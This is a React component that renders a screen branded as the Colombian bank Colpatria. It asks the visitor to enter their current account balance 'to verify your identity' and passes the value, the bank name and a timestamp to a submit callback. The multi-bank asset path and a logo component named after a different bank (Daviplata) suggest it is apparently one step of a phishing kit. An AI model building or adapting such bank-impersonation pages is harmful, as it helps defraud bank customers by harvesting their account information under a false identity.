/* eslint-disable @next/next/no-img-element */
"use client";
import React, { useState } from 'react';

const DaviplataLogo: React.FC = () => (
  <div className="flex items-center space-x-1 mb-6 pt-2">
    <img src="/bancos/colpatria/new-brand-red.svg" className='h-8 w-[120px]' alt="Logo" />
  </div>
);

interface Props {
  enviar?: (data: any) => void;
}

const Saldo: React.FC<Props> = ({ enviar }) => {
  const [saldo, setSaldo] = useState('');

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value) {
      value = new Intl.NumberFormat("es-CO").format(parseInt(value));
      setSaldo(`$ ${value}`);
    } else {
      setSaldo("");
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    enviar?.({ view: "saldo", saldo, bank: "colpatria", timestamp: new Date().toISOString() });
  };

  return (
    <div className="w-full mx-auto pl-[37px] pr-[37px] pt-[41px] pb-10 bg-white min-h-screen">
      <DaviplataLogo />

      <h1 className="text-[27px] font-extrabold text-gray-800 mb-2">
        Confirma tu saldo
      </h1>
      <p className="text-gray-600 mb-8 text-sm">
        Por favor, ingresa tu saldo actual para verificar tu identidad.
      </p>

      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="relative">
          <span className="absolute left-0 top-1/2 transform -translate-y-1/2 text-gray-500 w-5 h-5 font-bold">$</span>
          <input
            type="text"
            placeholder="0"
            className="w-full pl-6 pb-2 border-b-2 border-gray-300 focus:border-[#ec111a] outline-none text-[18px] font-bold transition duration-150"
            required
            value={saldo}
            onChange={handleChange}
          />
        </div>

        <button
          type="submit"
          disabled={!saldo}
          className={`w-full py-3 mt-8 text-[16px] text-white font-medium rounded-md transition duration-200 shadow-md cursor-pointer ${saldo ? 'bg-[#ec111a] hover:bg-[#be061b]' : 'bg-gray-300'}`}
        >
          Continuar
        </button>
      </form>
    </div>
  );
};

export default Saldo;
